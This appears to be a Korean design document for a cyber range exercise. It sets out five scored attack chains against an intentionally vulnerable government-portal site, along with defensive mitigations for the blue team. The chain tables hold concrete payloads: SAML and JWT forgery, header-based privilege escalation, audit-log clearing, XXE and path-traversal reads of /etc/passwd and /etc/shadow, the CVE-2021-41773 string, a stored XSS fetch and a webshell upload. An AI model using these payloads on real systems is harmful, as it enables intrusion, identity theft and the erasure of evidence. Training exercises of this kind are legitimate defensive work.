# GovPortal — HARD mode 5 Chain (P13 Phase 3)

> **HARD 모드**: 정부 민원 시스템의 SAML/JWT/권한/audit 영역을 깊이 묶은 5 chain.
> 단일 vuln 차단 시 다른 chain 으로 전환 — 공방전 장기화. 점수 +280.

## 강조 차별점 (vs Normal)
- **SAML SSO 우회**: XML signature wrapping + JIT auto-provisioning + issuer 무검증 chain
- **권한 매트릭스 우회**: X-Authority-Level header trust + JWT alg=none + mass assign 3중 우회
- **흔적 인멸**: audit log clear + verbose error 활용 reconnaissance
- **민원 비즈니스 로직**: 자동 cert 발급 + 강제 승인 chain (실제 운영 시스템 모방)

---

## Chain 1: SAML 위조 → 시민증 발급 → 흔적 인멸 (Identity Forgery & Cover-up)
**점수 +70** · **MITRE T1606.002 (Web Cookies) + T1556 + T1070**

| Step | 동작 | endpoint | 사용 vuln | 검증 |
|------|------|----------|-----------|------|
| 1.1 | SAML response 서명 없이 임의 SSN 으로 로그인 | `POST /saml/login` body `<Response><ssn>800101-1234567</ssn></Response>` | V01 서명 검증 약함 + V03 issuer 무검증 | session token |
| 1.2 | JIT auto-provisioning 으로 임의 SSN 새 시민 계정 생성 | 같은 endpoint, 신규 SSN | V02 JIT inject | new citizen_id |
| 1.3 | 자동 cert_number 추측 — `CERT-{year}-{citizen_id:04d}-{aid:03d}` | `GET /cert/<n>` enumerate | V07 예측 가능한 cert | 다른 시민 cert 노출 |
| 1.4 | 강제 승인 endpoint 로 본인 신청 자동 승인 + cert 발급 | `POST /applications/<id>/approve` 시민 권한으로 | V16 권한 검증 0 | "Approved" 응답 |
| 1.5 | audit 로그에서 본인 흔적 + admin 흔적 모두 삭제 | `POST /api/audit/clear?actor=admin` | V12 audit tampering | 로그 0 |

**완주 시**: 위조 신원 + 합법 인증서 + 흔적 0. BLUE 가 SAML 서명 강화해도 #1.2 JIT 또는 #1.4 강제승인 으로 우회.

---

## Chain 2: JWT 위조 → X-Auth-Level header → admin escalation (Auth Triple Bypass)
**점수 +60** · **MITRE T1556.004 + T1078.004**

| Step | 동작 | endpoint | 사용 vuln | 검증 |
|------|------|----------|-----------|------|
| 2.1 | 약한 JWT secret `gov-shared-secret-2023` brute → role=admin 위조 | (local) jwt.io | V05 weak secret | base64 jwt |
| 2.2 | alg=none 시도 (#2.1 실패 시 fallback) | `Authorization: Bearer eyJ.alg=none.` | V06 JWT none | 200 응답 |
| 2.3 | X-Authority-Level header 로 강제 권한 상승 | `X-Authority-Level: 99` 헤더 | V08 header trust | clerk/officer endpoint 접근 |
| 2.4 | mass assignment 로 본인 role + authority_level 영구 변경 | `POST /api/profile/update {"role":"admin","authority_level":99,"ssn":"..."}` | V20 mass assign | role:admin |
| 2.5 | 다른 시민 SSN 으로 합병 (계정 인수) | 같은 endpoint, 다른 ssn | V22 SSN 변경 가능 | 계정 합쳐짐 |

**완주 시**: 영구 admin 백도어 + 다른 시민 신원 인수. BLUE 가 JWT alg whitelist 적용해도 X-Authority-Level header trust 로 우회.

---

## Chain 3: XXE → LFI → cert 위조 (XML 외부 엔티티 + 파일 시스템)
**점수 +50** · **MITRE T1190 + T1005**

| Step | 동작 | endpoint | 사용 vuln | 검증 |
|------|------|----------|-----------|------|
| 3.1 | XML import 에 외부 엔티티 주입 → /etc/passwd 읽기 | `POST /api/applications/import` body `<!DOCTYPE [<!ENTITY x SYSTEM "file:///etc/passwd">]>...&x;` | V14 XXE | passwd 내용 |
| 3.2 | LFI 로 cert template 또는 secret 읽기 | `GET /cert/download?path=/app/templates/cert.html` | V17 LFI | template 노출 |
| 3.3 | path traversal 로 application directory 의 다른 파일 enumerate | `GET /cert/download?path=../../etc/shadow` | V17 + V13 | shadow 내용 |
| 3.4 | 추출한 template 으로 위조 cert 생성 + 본인 application 에 첨부 | `POST /apply` filename `forged_cert.html` | V09 file upload + V11 stored XSS | 신청 성공 |

**완주 시**: 시스템 파일 + 템플릿 노출 + 위조 cert 적법화. BLUE 가 XXE 차단해도 LFI 단독으로도 진행.

---

## Chain 4: PII bulk → CSRF → 신청서 위조 (Bulk Identity Theft)
**점수 +50** · **MITRE T1530 + T1078**

| Step | 동작 | endpoint | 사용 vuln | 검증 |
|------|------|----------|-----------|------|
| 4.1 | X-Forwarded-For 로 admin 우회 + 시민 list 추출 | `GET /api/admin/citizens` header `X-Forwarded-For: 127.0.0.1` | V19 X-Forwarded-For trust | 시민 100명 list |
| 4.2 | PII bulk export — SSN/주소/전화 평문 CSV | `GET /api/citizens/export.csv` | V18 PII bulk | csv 다운 |
| 4.3 | CSRF 로 victim 의 신청서 자동 제출 (외부 사이트 form auto-submit) | `POST /apply` victim cookie 도용 | V10 CSRF | 위조 신청 |
| 4.4 | victim 신청서에 stored XSS payload 삽입 → 담당 공무원 세션 탈취 | `POST /apply` content `<script>fetch('/api/admin/citizens')...</script>` | V11 stored XSS | clerk 세션 |
| 4.5 | clerk 세션으로 강제 승인 + 자동 cert 발급 | `POST /applications/<id>/approve` | V16 + V07 | cert 발급 |

**완주 시**: 100명 PII 탈취 + victim 명의 cert 발급. BLUE 가 CSRF 토큰 적용해도 #4.4 stored XSS 로 직접 clerk 세션 가로챔.

---

## Chain 5: default PIN → 파일 업로드 webshell → 영구 백도어 (Admin → Shell)
**점수 +50** · **MITRE T1078.001 + T1505.003**

| Step | 동작 | endpoint | 사용 vuln | 검증 |
|------|------|----------|-----------|------|
| 5.1 | default admin PIN `1234` 로 admin 콘솔 접근 | `POST /admin/console pin=1234` | V21 default PIN | console 페이지 |
| 5.2 | Apache 2.4.49 banner 확인 → CVE-2021-41773 path traversal 표적화 | `GET /` Server header → `GET /icons/.%%32%65/etc/passwd` | V24 banner + CVE-2021-41773 | passwd 내용 |
| 5.3 | 신청서 attachment 로 .php / .jsp / .exe 업로드 | `POST /apply` multipart `evil.php` | V09 확장자 검증 0 | 업로드 path |
| 5.4 | path traversal filename `../../var/www/shell.php` | 같은 endpoint filename `../../var/www/shell.php` | V13 path traversal | 임의 path 쓰기 |
| 5.5 | 업로드된 webshell 호출 → cmd execution + crontab 영속성 | `GET /shell.php?cmd=...` | RCE | beacon 가능 |

**완주 시**: 영구 webshell + system level RCE + 컨테이너 탈출 가능성. BLUE 가 .php 차단해도 .jsp 로 우회 + path traversal 단독으로 webshell 생성.

---

## BLUE 권장 차단 (Hard 모드)

| 차단 영역 | 우선순위 | 도구 |
|-----------|----------|------|
| SAML XML signature 강제 (signature wrapping 차단) | High | python3-saml + X.509 cert pin |
| JWT alg whitelist (RS256 only) + iat/exp 검증 | High | PyJWT verify_signature=True |
| X-Authority-Level / X-Forwarded-For header strip | High | nginx headers_more 또는 ProxyHeaders |
| audit log immutable storage (append-only + offsite) | High | systemd-journal seal + S3 WORM |
| File upload extension whitelist + magic bytes 검증 | High | python-magic, uploads/ no-exec |
| Path traversal 차단 (secure_filename + chroot) | Med | werkzeug.secure_filename + jail dir |
| CSRF 토큰 (Flask-WTF csrf_protect) | Med | wtforms.CSRFTokenField |
| XXE 차단 (XMLParser resolve_entities=False) | Med | defusedxml |
| Apache 2.4.49 → 2.4.51+ 업그레이드 | High | apt-get upgrade |
| default PIN 변경 + lockout policy | High | bcrypt + 5회 실패 lockout |

---

## 점수 가중

| chain | 단순 step 합 | chain 완주 보너스 | 총 |
|-------|-------------|-------------------|-----|
| Chain 1 SAML 위조 | +35 | +35 | **+70** |
| Chain 2 Auth 3중 우회 | +30 | +30 | **+60** |
| Chain 3 XXE+LFI | +25 | +25 | **+50** |
| Chain 4 PII+CSRF | +25 | +25 | **+50** |
| Chain 5 webshell | +25 | +25 | **+50** |
| **합** | **+140** | **+140** | **+280** |

5 chain 완주 시 +280 점 (Normal +150 의 1.9배).

---

## 운영자 점검

```bash
bash contents/vuln-sites/up.sh up   # govportal :3002 그대로 사용
# Battle admin UI 에서 site=govportal + difficulty=hard 선택 → 위 5 chain mission 자동 주입
```
